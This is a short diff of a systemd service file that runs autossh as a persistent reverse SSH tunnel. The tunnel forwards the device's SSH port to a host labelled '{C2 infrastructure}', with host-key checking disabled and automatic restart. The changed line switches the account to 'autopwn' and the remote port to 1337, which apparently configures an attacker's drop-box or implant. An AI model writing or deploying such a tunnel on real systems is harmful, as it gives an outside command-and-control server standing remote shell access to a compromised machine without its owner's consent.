@@ -11,7 +11,7 @@ After=network-online.target
 
 [Service]
 User=root
-ExecStart=/usr/bin/autossh -o StrictHostKeyChecking=no -i /root/.ssh/{key} -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -gnNT -R 2222:localhost:22 root@{C2 infrastructure}
+ExecStart=/usr/bin/autossh -o StrictHostKeyChecking=no -i /home/pi/.ssh/{key} -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -gnNT -R 1337:localhost:22 autopwn@{C2 infrastructure}
 RestartSec=15
 Restart=always
 KillMode=mixed
